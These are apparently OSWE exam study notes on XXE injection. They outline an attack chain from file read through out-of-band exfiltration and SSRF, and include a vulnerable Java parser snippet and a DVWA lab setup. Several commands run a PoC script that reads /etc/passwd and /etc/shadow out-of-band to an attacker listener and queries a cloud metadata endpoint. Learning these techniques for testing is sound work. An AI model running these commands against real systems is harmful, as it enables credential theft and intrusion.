# XXE (XML External Entity) File Read and SSRF PoC Notes

## Vulnerability Summary
- **Target**: Web applications parsing XML without proper validation
- **CVE**: N/A (Common vulnerability pattern)
- **Type**: XML External Entity Injection → File Read → SSRF → Potential RCE
- **Impact**: Information disclosure, SSRF, potential RCE

## Vulnerability Details

### Attack Chain
1. **Identify XML Parsing**: Find endpoints accepting XML (API, file upload, SOAP)
2. **Test Entity Expansion**: Inject simple entity to confirm parsing
3. **File Read**: Use file:// protocol to read local files
4. **Out-of-Band**: Use external DTD for blind data exfiltration
5. **SSRF**: Use http:// protocol to access internal services
6. **RCE**: Use expect:// or jar:// if available (rare)

### Root Cause
XML parsers with external entity processing enabled allow attackers to define and reference external entities, leading to file disclosure and SSRF.

**Vulnerable Code (Java)**:
```java
// VULNERABLE - External entities enabled
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xmlInput)));
```

## Lab Setup

### Docker Lab
```bash
# XXE vulnerable PHP app
docker run -d -p 8080:80 vulnerables/web-dvwa
# Or custom XML parser
```

### Testing Commands
```bash
# Basic file read
python3 poc.py 192.168.1.10 80 10.10.14.5 8000 --file /etc/passwd

# Out-of-band
python3 poc.py 192.168.1.10 80 10.10.14.5 8000 --attack-type oob --file /etc/shadow

# SSRF
python3 poc.py 192.168.1.10 80 10.10.14.5 8000 --attack-type ssrf --ssrf-target http://169.254.169.254/latest/meta-data/
```

## OSWE Exam Notes
- Check for XML parsing in source code (DocumentBuilder, XMLReader, simplexml_load_string)
- Always test both in-band and out-of-band methods
- Remember to URL-encode payloads if needed
- SSRF to localhost can lead to RCE via internal services

## References
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
